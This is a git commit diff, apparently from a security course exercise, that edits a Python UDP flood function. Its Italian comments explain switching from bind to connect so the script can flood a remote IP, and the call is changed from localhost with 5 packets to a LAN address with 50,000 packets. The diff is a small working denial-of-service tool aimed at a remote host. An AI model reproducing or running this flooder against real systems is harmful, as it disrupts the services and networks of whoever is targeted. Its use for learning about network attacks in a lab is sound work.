6cf7304a615b9c314722f85547529b20b55f7c3d
Riccardo <rickysalerno@protonmail.com>
2023-07-16 12:42:47 +0200

    aggiunta commenti

--- week2/week2_m2_d6/my_socket.py
+++ week2/week2_m2_d6/my_socket.py
@@ -22,14 +22,20 @@ def udp_flood_v1(indirizzo_ip, numero_porta, numero_pacchetti):
         print("Non posso creare un socket ad un ip che non ho.")
     else:
         target = (indirizzo_ip, numero_porta)
-        my_socket.bind((indirizzo_ip, numero_porta))
+        # Creando my_socket.bind possiamo dossare solo gli ip
+        # presenti nel nostro pc
+
+        # my_socket.bind((indirizzo_ip, numero_porta))
+
+        # Usando my_socket.connect possiamo floodare
+        # un ip remoto
+
+        my_socket.connect((indirizzo_ip, numero_porta))
         print(f"Il target selezionato è: {target}")
         for x in range(0, numero_pacchetti):
             my_socket.sendto(data_to_send, target)
             print(f"N:{x} - UDP inviati")
         my_socket.close()
 
-        return indirizzo_ip, numero_porta, numero_pacchetti
 
-
-udp_flood_v1("127.0.0.1", 5555, 5)
+udp_flood_v1("192.168.86.32", 5555, 50000)
